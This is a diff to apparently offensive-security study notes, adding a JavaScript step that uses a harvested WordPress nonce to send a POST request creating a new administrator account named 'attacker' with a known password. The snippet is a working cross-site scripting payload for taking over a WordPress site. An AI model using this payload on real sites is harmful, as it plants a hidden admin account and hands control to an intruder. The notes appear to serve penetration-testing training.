@@ -154,4 +154,12 @@ ajaxRequest.send();
 var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
 var nonce = nonceMatch[1];
 ```
+- Creating a new WordPress Admin with gathered nonce:
+```
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+```
 - 
